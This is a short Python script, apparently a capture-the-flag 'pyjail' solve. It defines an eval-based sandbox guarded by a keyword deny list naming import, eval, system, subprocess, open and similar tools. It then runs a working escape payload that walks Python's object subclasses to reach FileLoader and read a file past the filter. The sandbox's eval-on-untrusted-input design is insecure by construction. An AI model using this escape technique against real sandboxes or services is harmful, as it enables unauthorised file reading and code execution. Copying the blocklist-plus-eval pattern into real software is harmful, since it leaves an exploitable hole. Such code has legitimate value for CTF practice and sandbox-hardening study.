import sys

BANNED = [
    "import", "eval", "exec", "compile", "system", "popen", "subprocess",
    "open", "input", "breakpoint", "help", "pickle", "marshal", "os", "sys",
    "flag", "print", "write", "\\", "chr", "getattr", "setattr", "vars", "dir",
]
MAXLEN = 400

def jailed(src: str) -> str:
    src = src.strip()
    if not src:
        return ""
    if len(src) > MAXLEN:
        return "error: too long"
    low = src.lower()
    for b in BANNED:
        if b in low:
            return f"denied: '{b}' is not allowed"
    try:
        return repr(eval(src, {"__builtins__": {}}, {}))
    except Exception as e:
        return f"error: {type(e).__name__}: {e}"

payload = "[c for c in ().__class__.__mro__[1].__subclasses__() if c.__name__ == 'FileLoader'][0].get_data(None, 'sandboxed/jail.py')"

print("Payload:", payload)
print("Length:", len(payload))
res = jailed(payload)
print("Result preview:", res[:80])
